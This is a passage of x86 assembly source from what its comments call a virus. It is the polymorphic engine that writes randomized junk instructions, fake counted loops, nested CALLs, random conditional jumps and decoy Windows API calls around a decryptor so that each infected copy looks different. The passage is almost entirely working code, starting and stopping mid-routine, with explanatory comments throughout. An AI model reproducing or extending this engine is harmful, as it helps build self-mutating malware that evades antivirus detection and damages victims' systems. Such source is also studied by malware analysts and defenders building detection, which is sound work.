                or      ah, dl      ; Set the destiny register
                cmp     al, 38h     ; CMP?
                jnz   @@MW_WR_01    ; If not, avoid
      @@MW_WR_MOV:
                or      dl, dl      ; EAX?
                jz    @@MW_WR_EAX   ; Then, use its own opcode for MOV
                mov     al, 88h     ; Substitute CMP by MOV
                jmp   @@MW_WR_01    ; Jump and continue
      @@MW_WR_EAX:
                mov     al, 0A2h    ; AL=Opcode of MOV [Value],AL. From this
                                    ; opcode we get the variants
                call    RandomFlags ; Select 8 or 32 bits
                jz    @@MW_WR_EAX3  ; Jump if 8 bits
         @@MW_WR_EAX2:
                inc     eax         ; Increase opcode to make MOV [Value],EAX
         @@MW_WR_EAX3:
                cmp     byte ptr [ebp+@@MemoryRead], 1 ; Memory read?
                jnz   @@MW_WR_82    ; If not, jump and continue
                sub     al, 2       ; Make READ subtracting 2 to the opcode.
                                    ; Then we'll make MOV AL/EAX,[Value]
      @@MW_WR_82:          
                stosb               ; Store the opcode
                jmp   @@MW_WR_02    ; Jump to insert the memory address
          ; Not EAX in the register
      @@MW_WR_01:
                cmp     byte ptr [ebp+@@MemoryRead], 1 ; Memory read?
                jnz   @@ContinueMW                     ; If not, continue
                cmp     byte ptr [ebp+@@Memo32bits], 1 ; 32 bits?
                jz    @@MW_WR_32b         ; If 32 bits, jump
                jmp   @@MW_WR_8b          ; Avoid opcode increment
          ; Here to memory write
  @@ContinueMW: call    RandomFlags ; Decide: 8 or 32 bits?
                jz    @@MW_WR_8b    ; If 8, jump
      @@MW_WR_32b:
                inc     eax      ; Convert opcode to 32 bits operation from a
      @@MW_WR_8b:                ; a 8 bits opcode
                cmp     byte ptr [ebp+@@MemoryRead], 1 ; Read or write?
                jnz   @@MW_WR_83     ; If write, jump
                add     al, 2        ; Convert write opcode to read opcode
      @@MW_WR_83:
                stosw                ; Store the opcode
      @@MW_WR_02:
                mov     eax, ebx
                stosd      ; Store the memory address (or calculated addition)
                jmp   @@Return    ; Jump to return

   ;; Here we make recursive garbage. We can do a CALL to a subroutine (where
   ;; we need more garbage) or a comparision and a conditional jump, where we
   ;; have to make garbage between the jump and the destination address, since
   ;; we can't assure that the conditional jump is going to be taken or not,
   ;; or a call to a KERNEL32 function.
    @@RecursiveOnes:
                cmp     byte ptr [ebp+GarbageRecursivity], 4 ; Too many recur-
                                         ; sive instances of function Garbage?
                jz    @@Make1      ; If too many, make another type of garbage
                cmp     byte ptr [ebp+ImInRandomLoop], 1
                jz    @@Make1
                call    RandomFlags
                jz    @@Recurs_002
                js    @@Recurs_002 ; Select CALL / Conditional jump
                jp    @@Recurs_002
     ;; Let's do a little loop (no more than seven loops). We use a reserved
     ;; register because we know that they won't be changed (we PUSH it and
     ;; later POP it)
  @@RandomLoop: call    Random
                and     eax, 3
                cmp     al, 2
                jz    @@RandomLoop ; Don't use key register
                mov     al, [ebp+eax+Index1Register]
                cmp     al, 08h
                jz    @@Make1
                cmp     byte ptr [ebp+eax+TouchedRegisters], 1
                jnz   @@Make1
                mov     byte ptr [ebp+ImInRandomLoop], 1
                mov     byte ptr [ebp+@@SelectedRegister], al
                mov     dl, al
                add     al, 50h
                stosb              ; Store PUSH
      @@OtherRandom:
                call    Random            ; Get a value that doesn't make any
                cmp     eax, 8            ; problem when using either signed
                jbe   @@OtherRandom       ; or unsigned comparisions (this
                cmp     eax, 7FFFFFF7h    ; means, the initial value of the
                jbe   @@RandomOK          ; counter and the final one - the
                cmp     eax, 80000008h    ; compared - can be compared with
                jbe   @@OtherRandom       ; sign or without sign), so we can
                cmp     eax, 0FFFFFFF7h   ; use JG/JGE/JA/JAE when decreasing
                jae   @@OtherRandom       ; and JL/JLE/JB/JBE when increasing,
                                          ; apart of J(N)Z/J(N)S for both
    @@RandomOK: mov     [ebp+@@InitLoopValue], eax ; Save that value
                call    DoMOV             ; Make a mov with the selected reg.
                call    DoRandomGarbage   ; Make garbage
                mov     esi, edi          ; Save the looping address
     @@RandomLoopAgain01:
                call    DoRandomGarbage   ; Make garbage
                cmp     esi, edi          ; Did it make garbage?
                jz    @@RandomLoopAgain01 ; If not, repeat
                call    RandomFlags       ; Select increasing or decreasing
                setz    al                ; Set it in AL
                mov     [ebp+@@Increasing], al ; Save this flag
                jz    @@IncreaseReg       ; If ZF (AL=1), increase
     @@DecreaseReg:
                call    Random
                and     al, 3         ; Get one of three types for decreasing:
                jz    @@DecreaseReg   ; DEC, ADD -1 or SUB 1
                cmp     al, 2
                jb    @@DecreaseWithADD
                jz    @@DecreaseWithSUB
     @@DecreaseWithDEC:
                mov     al, 48h       ; Opcode of DEC
                add     al, [ebp+@@SelectedRegister] ;Bind the register to the
                stosb                                ; opcode and store it
                jmp   @@RL_Next01
     @@DecreaseWithADD:
                mov     ax, 0C083h    ; ADD Reg,(Dword-Packed-To-Byte)
                or      ah, [ebp+@@SelectedRegister] ; Set the register
                stosw                 ; Store opcode
                mov     al, 0FFh      ; ADD Reg,-1
                stosb                 ; Store it
                jmp   @@RL_Next01     ; Jump to complete
     @@DecreaseWithSUB:
                mov     ax, 0E883h    ; SUB Reg,(Dword-Packed-To-Byte)
                or      ah, [ebp+@@SelectedRegister] ; Set the register
                stosw                 ; Store the opcode
                mov     al, 1         ; SUB Reg,1
                stosb                 ; Store the value
     @@RL_Next01:
                call    Random        ; Get a number between 4 and 7
                and     eax, 3
                add     eax, 4
                sub     eax, [ebp+@@InitLoopValue] ;Subtract it to the initial
                neg     eax                    ; value and get the final value
                jmp   @@PutComparisionForLoop  ; Jump to complete
          ; Here if we increase
     @@IncreaseReg:
                call    Random        ; Get randomly INC, ADD 1 or SUB -1
                and     al, 3
                jz    @@IncreaseReg
                cmp     al, 2
                jb    @@IncreaseWithADD
                jz    @@IncreaseWithSUB
     @@IncreaseWithDEC:
                mov     al, 40h       ; INC Reg
                add     al, [ebp+@@SelectedRegister] ; Set the register
                stosb                 ; Store it
                jmp   @@RL_Next02     ; Jump to continue
     @@IncreaseWithADD:
                mov     ax, 0C083h    ; ADD Reg,(Dword-Packed-To-Byte)
                or      ah, [ebp+@@SelectedRegister] ; Set the register
                stosw                 ; Store the opcode
                mov     al, 01h       ; ADD Reg,1
                stosb                 ; Store the value
                jmp   @@RL_Next02     ; Jump to continue
     @@IncreaseWithSUB:
                mov     ax, 0E883h    ; SUB Reg,(Dword-Packed-To-Byte)
                or      ah, [ebp+@@SelectedRegister] ; Bind the register
                stosw                 ; Store the opcode
                mov     al, 0FFh      ; SUB Reg,-1
                stosb                 ; Store the value
     @@RL_Next02:
                call    Random        ; Get a value between 4 and 7
                and     eax, 3
                add     eax, 4
                add     eax, [ebp+@@InitLoopValue] ; Add it to the initial
                                               ; value to get the final value
     @@PutComparisionForLoop:
                push    eax          ; Save the final value of the counter
                cmp     byte ptr [ebp+@@SelectedRegister], 0 ; Is EAX the re-
                                                 ; gister that we are using?
                jz    @@CMP_EAX      ; If it is, use the EAX exclusive opcode
                                     ; to do CMP
                mov     ax, 0F881h   ; Opcode of CMP
                or      ah, [ebp+@@SelectedRegister] ; Set the register
                stosw                ; Store the opcode
                jmp   @@RL_Next03    ; Jump and continue
     @@CMP_EAX: mov     al, 3Dh      ; Use the opcode of CMP EAX,Value
                stosb                ; Store it
   @@RL_Next03: pop     eax        ; Get the value to CMP
                stosd              ; Store the value
                movzx   ebx, byte ptr [ebp+@@Increasing] ; EBX=0 or 1
                shl     ebx, 3                           ; EBX=0 or 8
                lea     ebx, [ebp+ebx+@@JumpsForLoopD]  ; EBX=Address of jumps
                                                        ; table
   @@RL_Next04: call    Random       ; Get a random number between 0 and 5
                and     eax, 7
                cmp     eax, 6
                jae   @@RL_Next04
                mov     al, [ebx+eax] ; Get a jump opcode
                sub     esi, edi
                sub     esi, 2       ; Get the loop distance for the jump back
                cmp     esi, -80h    ; Check if we use the 8 bits opcode or
                jae   @@RL_Next05    ; the 32 one. Jump if we use the 8 bits
                                     ; conditional jump.
                sub     esi, 4      ; Add 4 to the displacement back

                mov     ah, al
                add     ah, 10h      ; Convert the 8 bits opcode to the 32
                mov     al, 0Fh      ; bits one
                stosw                ; Store it
                xchg    esi, eax
                stosd                ; Store the displacement
                jmp   @@RL_Next06    ; Jump and continue
   @@RL_Next05: stosb                ; Store the 8 bits opcode
                xchg    esi, eax
                stosb                ; Store the displacement
   @@RL_Next06: call    DoRandomGarbage
                mov     al, [ebp+@@SelectedRegister]
                add     al, 58h  ; Store POP with the used register
                stosb
                mov     byte ptr [ebp+ImInRandomLoop], 0
                jmp   @@Return

@@JumpsForLoopD db      79h, 75h, 77h, 73h, 7Fh, 7Dh, 0, 0
                ;       JNS, JNZ,  JA, JAE,  JG, JGE
@@JumpsForLoopI db      78h, 75h, 72h, 76h, 7Ch, 7Eh, 0, 0
                ;       JS,  JNZ,  JB, JBE,  JL, JLE
@@SelectedRegister      db      0
@@InitLoopValue         dd      0
@@Increasing            db      0

 @@Recurs_002:  call    RandomFlags    ; Select if we do a CALL or a jump
                jz    @@DoConditionalJump  ; Make a conditional jump if ZF
                js    @@DoCALL
    @@APICall:  cmp     byte ptr [ebp+ImInRandomLoop], 1
                jz    @@Make1
                call    RandomFlags
                jz    @@Make1
                call    InsertAPICall
                jmp   @@Return
    @@DoCALL:   call    RandomFlags
                jz    @@NormalCALL
                movzx   eax, byte ptr [ebp+GarbageRecursivity]
                dec     eax
                mov     ecx, eax
                shl     ecx, 5
                add     ecx, eax
                shl     ecx, 2
                cmp     dword ptr [ebp+ecx+ArrayOfCalls1Ndx], 4
                jb    @@NormalCALL
                ja    @@SelectRandomFixedCALL
                mov     eax, [ebp+ecx+ArrayOfCalls1]
                jmp   @@ContinueFixedCALL_002
      @@SelectRandomFixedCALL:
                lea     esi, [ebp+ecx+ArrayOfCalls1]
      @@LoopFixedCALL_001:
                call    Random
                and     eax, 3Ch
                cmp     eax, [ebp+ecx+ArrayOfCalls1Ndx]
                jae   @@LoopFixedCALL_001
                add     eax, ecx
                mov     eax, [ebp+eax+ArrayOfCalls1]
        @@ContinueFixedCALL_002:
                sub     eax, [ebp+DecryptorBeginAddress]
                add     eax, [ebp+DecryptorVirtualBeginAddress]
                call    MakeCALLTo
                jmp   @@Return

         @@NormalCALL:
                cmp     dword ptr [ebp+CallsLevel1Ndx], 20h*4
                jz    @@Make1   ; If we can't do more level 1 calls, do other
                                ; type of garbage
                cmp     dword ptr [ebp+CallsLevel2Ndx], 20h*4
                jz    @@Make1   ; If we can't do more level 2 calls, do other
                                ; type of garbage
                cmp     dword ptr [ebp+CallsLevel3Ndx], 20h*4
                jz    @@Make1   ; If we can't do more level 3 calls, do other
                                ; type of garbage
                cmp     byte ptr [ebp+KeyIsInit], 1 ; Is the key register set?
                jnz   @@Make1                ; If it isn't, then avoid CALLs.
                         ; Explanation: we make first the CALL and quite later
                         ; we code the subroutine itself. Then, we maybe put
                         ; inside the subroutines any indexed memory access,
                         ; for which we need the Key register with its correct
                         ; value. If it isn't set yet, then when call to the
                         ; subroutine we'll use the Key register as index but
                         ; with an unknown value.
                call    RandomFlags  ; Stack entries?
                jz    @@NoStack
                js    @@NoStack
                           ; Put stack entries with a 25% of probability
                mov     byte ptr [ebp+@@WithStack], 1 ; Mark it
                call    Random
                and     eax, 3
                inc     eax          ; Get a number between 1 and 4
                mov     byte ptr [ebp+@@StackEntries], al ; Save this number
                mov     ecx, eax     ; ECX=that number
   @@LoopInsertEntries:
                mov     al, 68h      ; Opcode of PUSH Value
                stosb                ; Store it
   @@AnotherValueTypeForStack:
                call    Random       ; Get a random type of value to push
                and     al, 3
                jz    @@PushRegister    ; AL=0? Then push a register
                cmp     al, 2
                jb    @@PushAddress     ; AL=1? Then push a memory address
                jz    @@PushPureRandom  ; AL=2? Then push a random dword
    @@PushPseudoFlags:                  ; AL=3? Then push a random < 10000h
                call    Random                               ; (like flags)
                and     eax, 0FFFFh
                jmp   @@NextStackEntry  ; Store value
    @@PushAddress:
                call    SelectAnAddressLow ; Get an address
                mov     eax, ebx        ; Put it into EAX and jump to store it
                jmp   @@NextStackEntry  ; Jump to store it
    @@PushRegister:
                call    SelectAnyRegisterWithInit
                dec     edi
                add     al, 50h
                stosb
                jmp   @@ContinueStackEntries
    @@PushPureRandom:
                call    Random          ; EAX=Random value
    @@NextStackEntry:
                cmp     eax, 7Fh
                jbe   @@TwoBytesEntry
                cmp     eax, 0FFFFFF80h ; Is the value between -80h and 7Fh?
                jae   @@TwoBytesEntry   ; If it is, change the opcode
                stosd                   ; Store the dword
                jmp   @@ContinueStackEntries ; Jump and continue

   @@TwoBytesEntry:
                mov     byte ptr [edi-1], 6Ah ; Change the opcode by PUSH
                stosb         ; Packed_Dword_Value and store the value to push
   @@ContinueStackEntries:
                loop  @@LoopInsertEntries ; Loop and make it ECX times
                jmp   @@ContinueCALL      ; Continue the CALL coding
                ;; Here if we don't use stack
   @@NoStack:   mov     byte ptr [ebp+@@WithStack], 0 ; Set this variable
   @@ContinueCALL:
                mov     al, 0E8h
                stosb             ; Insert a CALL opcode
                movzx   ebx, byte ptr [ebp+GarbageRecursivity] ; Get the level
                dec     ebx                                    ; of the stack
                mov     ecx, ebx  
                shl     ebx, 5   ; *20h
                add     ebx, ecx ; *21h
                shl     ebx, 2   ; *84h, so we get the level multiplied by
                                 ; 84h, to use a generic way of setting the
                                 ; CALL data into the arrays depending on the
                                 ; level
                mov     ecx, [ebp+ebx+CallsLevel1Ndx] ;Get the index of inser-
                                                      ;tion
                add     ecx, ebx ; Add the level*84h
                mov     dword ptr [ebp+ecx+CallsLevel1], edi ; Set the current
                                 ; address into the array for later completion
                add     dword ptr [ebp+ebx+CallsLevel1Ndx], 4 ; Increase the
                                                        ; index of insertion
                add     edi, 4   ; Leave space for the CALL displacement and
                                 ; complete it later
                cmp     byte ptr [ebp+@@WithStack], 1 ; Have we used stack?
                jnz   @@Return                        ; If not, finish
                mov     ax, 0C483h  ; AX=Opcode of the instruction ADD ESP,xxx
                stosw               ; Store the opcode
                mov     al, byte ptr [ebp+@@StackEntries] ; Get the number to
                shl     al, 2       ; add to ESP to release the stack
                stosb               ; Store it
                jmp   @@Return      ; Return

@@WithStack     db      0    ; Variables used before
@@StackEntries  db      0

   ;; Here we make a random conditional jump. The comparision is absolutely
   ;; random, so it's the condition to jump. Between the jump and the destiny
   ;; we make functional garbage, since we don't know if the jump is going to
   ;; be taken or not.
    @@DoConditionalJump:
                call    SelectARegisterWithInit ; Get a initialized register
                mov     dl, al        ; Save it in DL
                call    RandomFlags   ; CMP Reg,Value or CMP Reg,Reg?
                jz    @@CMP_Reg       ; Then make a CMP Reg,Reg
        @@CMP_Value:
                or      dl, dl
                jnz   @@CMP_Value_NoEax
                mov     al, 3Dh
                stosb
                jmp   @@CMP_Value_Cont00
        @@CMP_Value_NoEax:
                mov     ax, 0F881h    ; Opcode of CMP Reg,Value
                or      ah, dl        ; Set the register
                stosw                 ; Store it
        @@CMP_Value_Cont00:
                call    Random
                stosd                 ; Store a random value to compare
                jmp   @@CJ_Again      ; Jump to continue
        @@CMP_Reg:
                call    SelectAnyRegisterWithInit ; Get any initialized regis-
                                          ; ter (all can be selected but ESP)
                cmp     al, dl      ; Is it the same as the selected before?
                jz    @@CMP_Reg     ; If it is the same, then repeat
                mov     dh, al      ; Save it in DH
                mov     ax, 0C03Bh  ; 3B C0, opcode of CMP Reg,Reg
                or      ah, dl      ; Set the selected registers
                shl     dh, 3
                or      ah, dh
                stosw               ; Store the opcode
            ; Let's do a random conditional jump
        @@CJ_Again:
                call    Random
                and     al, 0Fh
                add     al, 70h  ; Get a conditional jump random opcode
                stosb            ; Store it
                inc     edi      ; Leave space for the displacement
        @@CJ_Again3:
                push    dword ptr [ebp+CallsLevel1Ndx] ; Save the indexes of
                push    dword ptr [ebp+CallsLevel2Ndx] ; the calls. If we have
                push    dword ptr [ebp+CallsLevel3Ndx] ; to repeat the garbage
                                   ; because it's too long, we have to restore
                                   ; this to not set any inexistent CALL dis-
                                   ; placement over other code that's not a
                                   ; CALL
        @@CJ_Again2:
                mov     esi, edi   ; Save the actual storage index
                call    DoRandomGarbage ; Make garbage
                call    DoRandomGarbage ; Make garbage
                sub     esi, edi   ; Get the (-)displacement of the jump
                jz    @@CJ_Again2  ; If it's zero, loop to make garbage
                neg     esi        ; Calculate true displacement
                cmp     esi, 7Fh   ; Does it overpass the limit for displac.?
                jbe   @@CJ_OK      ; If not, jump and continue
                pop     dword ptr [ebp+CallsLevel3Ndx] ; Restore this, elimi-
                pop     dword ptr [ebp+CallsLevel2Ndx] ; nating any created
                pop     dword ptr [ebp+CallsLevel1Ndx] ; call before
                sub     edi, esi   ; Restore EDI...
                jmp   @@CJ_Again3  ; ...and repeat the garbage generation
               ; Here if the size of the garbage is correct
       @@CJ_OK: pop     eax ; Release the data in stack
                pop     eax
                pop     eax
                mov     eax, esi ; Put the displacement in AL
                neg     esi      ; Calculate the distance until the opcode
                mov     byte ptr [edi+esi-1], al ; Set the displacement in
                                                 ; the opcode
              ;  jmp   @@Return

    @@Return:
    @@DontMake: mov     [esp+S_EDI], edi  ; Conserve EDI when POPAD
                dec     byte ptr [ebp+GarbageRecursivity] ; Decrease recursi-
                                                          ; vity level
                popad
                ret     ; Return completely or just to another running instan-
                        ; ce of Garbage
Garbage         endp

ImInRandomLoop  db      0    ; Variable to avoid nested garbage loops

;; EAX=Address to make a CALL to
MakeCALLTo      proc
                pushad
                mov     ebx, eax
                call    RandomFlags
                jz    @@CALLToMem
  @@CALLToReg:  call    Random
                and     eax, 3
                cmp     eax, 2
                jz    @@CALLToReg   ; No key register!
                mov     dl, [ebp+eax+Index1Register]
                cmp     dl, 8
                jnz   @@CALLToReg2
                mov     dl, [ebp+Index1Register]
  @@CALLToReg2: call    DoPUSHReg
                call    DoRandomGarbage
                mov     eax, ebx
                call    DoMOV
                call    DoRandomGarbage
                mov     ax, 0D0FFh
                or      ah, dl
                stosw
                call    DoRandomGarbage
                call    DoPOPReg
                jmp   @@Return

  @@CALLToMem:  call    GetAndReserveVar
                or      ebx, ebx
                jz    @@CALLToReg

                call    RandomFlags
                jz    @@MoveToRegForCALL
       @@DirectCALLToMem:
                call    DoMOVMemValue
                call    DoRandomGarbage
                call    RandomFlags
                jz    @@DC_00
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@DC_00
                push    ebx
                mov     ax, 10FFh
                sub     ebx, [ebp+DecryptKey]
                cmp     ebx, 7Fh
                jbe   @@DC_01
                cmp     ebx, 0FFFFFF80h
                jae   @@DC_01
                or      ah, 80h
                or      ah, [ebp+KeyRegister]
                stosw
                mov     eax, ebx
                stosd
                jmp   @@DC_02
      @@DC_01:  or      ah, 40h
                or      ah, [ebp+KeyRegister]
                stosw
                mov     al, bl
                stosb
      @@DC_02:  pop     ebx
      @@DC_03:  call    ReleaseVar
                jmp   @@Return
      @@DC_00:  mov     ax, 15FFh
                stosw
                mov     eax, ebx
                stosd
                jmp   @@DC_03

     @@MoveToRegForCALL:
                mov     ecx, eax
                call    RandomFlags
                jz    @@DirectValueForCALL
                call    Random
                sub     ebx, eax
                mov     byte ptr [ebp+@@PureValue], 0
                mov     dword ptr [ebp+@@ValueToAdd], eax
                jmp   @@DVFC_001
     @@DirectValueForCALL:
                mov     byte ptr [ebp+@@PureValue], 1
                mov     dword ptr [ebp+@@ValueToAdd], 0
    @@DVFC_001: call    Random
                and     eax, 3
                cmp     eax, 2
                jz    @@DVFC_001
                mov     dl, [ebp+eax+Index1Register]
                cmp     dl, 8
                jnz   @@DVFC_001_
                mov     dl, [ebp+Index1Register]
   @@DVFC_001_: call    RandomFlags
                jz    @@FirstMovReg
    @@FirstMovMem:
                call    RandomFlags
                jz    @@FMM_PushFirst
                mov     eax, ecx
                push    dword ptr [ebp+@@PureValue]
                push    dword ptr [ebp+@@ValueToAdd]
                push    ebx
                add     ebx, [ebp+@@ValueToAdd]
                call    DoMOVMemValue
                pop     ebx
                call    DoRandomGarbage
                call    DoPUSHReg
                pop     dword ptr [ebp+@@ValueToAdd]
                pop     dword ptr [ebp+@@PureValue]
     @@FMM_001: push    dword ptr [ebp+@@PureValue]
                push    dword ptr [ebp+@@ValueToAdd]
                call    DoRandomGarbage
                mov     eax, ebx
                call    DoMOV
                pop     dword ptr [ebp+@@ValueToAdd]
                pop     dword ptr [ebp+@@PureValue]
                jmp   @@InsertCALL
      @@FMM_PushFirst:
                push    dword ptr [ebp+@@PureValue]
                push    dword ptr [ebp+@@ValueToAdd]
                call    DoPUSHReg
                call    DoRandomGarbage
                pop     dword ptr [ebp+@@ValueToAdd]
                pop     dword ptr [ebp+@@PureValue]
                mov     eax, ecx
                push    ebx
                add     ebx, [ebp+@@ValueToAdd]
                push    dword ptr [ebp+@@PureValue]
                push    dword ptr [ebp+@@ValueToAdd]
                call    DoMOVMemValue
                pop     dword ptr [ebp+@@ValueToAdd]
                pop     dword ptr [ebp+@@PureValue]
                pop     ebx
                jmp   @@FMM_001
    @@FirstMovReg:
                push    dword ptr [ebp+@@PureValue]
                push    dword ptr [ebp+@@ValueToAdd]
                call    DoPUSHReg
                call    DoRandomGarbage
                mov     eax, ebx
                call    DoMOV
                call    DoRandomGarbage
                mov     eax, ecx
                pop     dword ptr [ebp+@@ValueToAdd]
                pop     dword ptr [ebp+@@PureValue]
                push    ebx
                add     ebx, [ebp+@@ValueToAdd]
                push    dword ptr [ebp+@@PureValue]
                push    dword ptr [ebp+@@ValueToAdd]
                call    DoMOVMemValue
                pop     dword ptr [ebp+@@ValueToAdd]
                pop     dword ptr [ebp+@@PureValue]
                pop     ebx
    @@InsertCALL:
                push    dword ptr [ebp+@@PureValue]
                push    dword ptr [ebp+@@ValueToAdd]
                call    DoRandomGarbage
                pop     dword ptr [ebp+@@ValueToAdd]
                pop     dword ptr [ebp+@@PureValue]
                mov     ax, 10FFh
                or      ah, dl
                cmp     byte ptr [ebp+@@PureValue], 1
                jz    @@WithoutAddition
       @@WithAddition:
                cmp     dword ptr [ebp+@@ValueToAdd], 7Fh
                jbe   @@WA_byte
                cmp     dword ptr [ebp+@@ValueToAdd], 0FFFFFF80h
                jae   @@WA_byte
                or      ah, 80h
                stosw
                mov     eax, [ebp+@@ValueToAdd]
                stosd
                jmp   @@OK2
     @@WA_byte: or      ah, 40h
                stosw
                mov     eax, [ebp+@@ValueToAdd]
                stosb
                jmp   @@OK2

     @@WithoutAddition:
                cmp     dl, 5
                jz    @@WithAddition
         @@OK:  stosw
         @@OK2: call    DoRandomGarbage
                call    DoPOPReg
                call    ReleaseVar
            ;    jmp   @@Return

     @@Return:  mov     [esp+S_EDI], edi
                popad
                ret
@@PureValue     db      0
@@ValueToAdd    dd      0

MakeCALLTo      endp

ReserveReg      proc
                pushad
          @@OtherRandom:
                call    Random
                and     eax, 3
                cmp     eax, 2
                jz    @@OtherRandom
                mov     dl, [ebp+eax+Index1Register]
                cmp     dl, 8
                jnz   @@AnyReg
                mov     dl, [ebp+Index1Register]
      @@AnyReg: call    DoPUSHReg
      @@Return: mov     [esp+S_EDX], edx
                mov     [esp+S_EDI], edi
                popad
                ret
ReserveReg      endp

ReleaseReg      proc
                pushad
                call    DoPOPReg
      @@Return: mov     [esp+S_EDI], edi
                popad
                ret
ReleaseReg      endp


;; This function selects a readable/writable memory address that can be used
;; for memory operations without causing any exception. It will get any
;; address from five frames that are prepared from the beginning. In this
;; virus there are five frames, but in another maybe there is one or two, so
;; we simply would put the same frames in the different variables.
;; I use here the .bss section (as a normal application does), and since the
;; section of the virus is theorically a data section, then some data frames
;; that the virus sets with its values while executing, not needing what was
;; there (that idea was made in MeDriPolEn, but now I pulished it).
SelectAnAddress proc
                push    eax
                push    ecx
      @@Again:  call    Random
                and     eax, 7
                cmp     eax, 5  ; Get a data frame from 0 to 4
                jae   @@Again
                mov     ebx, [ebp+4*eax+BssSection] ; Get the address of that
                                                    ; frame

  ; I think a normal .bss section has 256 bytes at least! (and the others I'm
  ; sure they have them)
      @@Again2: call    Random
                cmp     byte ptr [ebp+SelectLowAddress], 1
                jz    @@LowAddress
                and     eax, 03Ch
                cmp     al, 30h
                ja    @@Again2
                or      al, 80h
                jmp   @@Done
       @@LowAddress:
                and     eax, 7Ch                
       @@Done:  add     ebx, eax  ; Now we have a random address
                cmp     dword ptr [ebp+ReservedBssAddress], ebx ; See if it's
                                  ; equal to the reserved one
                jz    @@Again     ; If it's equal (what a casuality!) then
                                  ; select another
                mov     ecx, 20h
    @@Loop_01:  cmp     ebx, [ebp+4*ecx+ReservedMemVars_Addr-4]
                jz    @@Again
                loop  @@Loop_01

      @@Return: pop     ecx
                pop     eax
                ret            ; Return
SelectAnAddress endp

SelectAnAddressLow proc
                mov     byte ptr [ebp+SelectLowAddress], 1
                jmp     SelectAnAddress
SelectAnAddressLow endp

SelectAnAddressHigh proc
                mov     byte ptr [ebp+SelectLowAddress], 0
                jmp     SelectAnAddress
SelectAnAddressHigh endp

SelectLowAddress db     0

;; This function gets a random register (random number between 0 and 7) and
;; keep on getting it until that number doesn't coincide with any reserved
;; register identificator, nor with ESP, nor with the selected in the last
;; call to this function or similar.
SelectARegister proc
                call    Random
                and     al, 7   ; Random between 0 and 7
                cmp     al, 4   ; ESP?
                jz      SelectARegister ; Then, repeat
                cmp     al, byte ptr [ebp+Index1Register] ; Equal to Index1?
                jz      SelectARegister                   ; Then, repeat
                cmp     al, byte ptr [ebp+Index2Register] ; Equal to Index2?
                jz      SelectARegister                   ; Then, repeat
                cmp     al, byte ptr [ebp+KeyRegister]    ; Equal to Key?
                jz      SelectARegister                   ; Then, repeat
                cmp     al, byte ptr [ebp+BufferRegister] ; Equal to Buffer?
                jz      SelectARegister                   ; Then, repeat
                cmp     al, byte ptr [ebp+RegisterSelectedB4] ; If it's equal
                jz      SelectARegister    ; to the last selected one, repeat
                mov     byte ptr [ebp+RegisterSelectedB4], al ; Save as the
                ret                           ; last selected, and return
SelectARegister endp

;; This function does the same as the function above but with a 8 bits regis-
;; ter, so it can only select E?X registers. Since there are four reserved
;; registers and only four composed registers (E?X), maybe this registers are
;; all reserved, so we check it before, returning the value 8 if no 8 bits re-
;; gister can be selected. Also we initialize the register if the selected one
;; hasn't been "touched" before, since we only use 8 bits registers to make
;; garbage.
SelectAReg8     proc
                cmp     byte ptr [ebp+Index1Register], 3 ; E?X?
                ja    @@NoProblemo                       ; If, not, continue
                cmp     byte ptr [ebp+Index2Register], 3 ; E?X?
                ja    @@NoProblemo                       ; If, not, continue
                cmp     byte ptr [ebp+KeyRegister], 3    ; E?X?
                ja    @@NoProblemo                       ; If, not, continue
                cmp     byte ptr [ebp+BufferRegister], 3 ; E?X?
                ja    @@NoProblemo                       ; If, not, continue
                mov     al, 8    ; Since all reserved are E?X, we can't conti-
                ret              ; nue
    @@NoProblemo:
                call    Random
                and     al, 3    ; Get a E?X register
                cmp     al, byte ptr [ebp+Index1Register] ; Is it reserved?
                jz    @@NoProblemo                        ; If not, continue
                cmp     al, byte ptr [ebp+Index2Register] ; Is it reserved?
                jz    @@NoProblemo                        ; If not, continue
                cmp     al, byte ptr [ebp+KeyRegister]    ; Is it reserved?
                jz    @@NoProblemo                        ; If not, continue
                cmp     al, byte ptr [ebp+BufferRegister] ; Is it reserved?
                jz    @@NoProblemo                     ; If not, continue
                push    eax
                and     eax, 0FFh       ; Look if the register is "touched"
                cmp     byte ptr [ebp+eax+TouchedRegisters], 1
                jz    @@OK              ; If it is, jump and continue
                push    edx         ; Save registers
                mov     dl, al      ; DL=Selected 32 bits register
                call    Random      ; Set a random value
                call    DoMOV  ; Make a MOV (or similar) with the reg and the
                pop     edx    ; value, and restore the registers from stack
     @@OK:      pop     eax
                and     ah, 4
                or      al, ah  ; Select random ?L or ?H
                ret             ; Return
SelectAReg8     endp

;; API calling thingies
InsertAPICall   proc
                pushad
                cmp     byte ptr [ebp+ImInAPI], 1
                jz    @@End2
                cmp     byte ptr [ebp+AnyAPIFound], 1
                jnz   @@End2
                mov     byte ptr [ebp+ImInAPI], 1
                mov     byte ptr [ebp+APICall_StackOrder], 0

                lea     ebx, [ebp+offset APICall_SaveEAX]
                lea     ecx, [ebp+offset APICall_SaveECX]
                lea     edx, [ebp+offset APICall_SaveEDX]
                lea     esi, [ebp+offset DoRandomGarbage]
                call    RandomCalling

                cmp     byte ptr [ebp+FirstAPICall], 2
                jz    @@Normal
       @@OtherRandom:
                inc     byte ptr [ebp+FirstAPICall]
                call    Random
                and     eax, 30h
                jmp   @@Continue1
          @@Normal:
                call    Random
                and     eax, 1Fh
                mov     ebx, eax
                call    Random
                and     eax, 0Fh
                sub     ebx, eax
                jbe   @@Normal
                mov     eax, 1Fh
                sub     eax, ebx
                shl     eax, 4 ; *10h
     @@Continue1:
                mov     esi, eax
     @@LoopSearch:
                cmp     dword ptr [ebp+esi+APIInfo+4], 0
                jnz   @@APIFound
                add     esi, 10h
                cmp     esi, 20h*10h
                jb    @@LoopSearch
                xor     esi, esi
                jmp   @@LoopSearch
   @@APIFound:  mov     al, byte ptr [ebp+esi+APIInfo+0Ah]
                call    PushParameter
                mov     al, byte ptr [ebp+esi+APIInfo+09h]
                call    PushParameter
                mov     al, byte ptr [ebp+esi+APIInfo+08h]
                call    PushParameter

                call    RandomFlags
                jz    @@WithAddition

       @@WithoutAddition:
                mov     ax, 15FFh   ;; CALL DWORD PTR [xxx]
                stosw
                mov     eax, [ebp+esi+APIInfo+04h]
                stosd
                jmp   @@Continue

       @@WithAddition:
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@WithoutAddition
                mov     ax, 10FFh
                or      ah, [ebp+KeyRegister]
                mov     ecx, [ebp+esi+APIInfo+04]
                sub     ecx, [ebp+DecryptKey]
                cmp     ecx, 7Fh
                jbe   @@AddByte
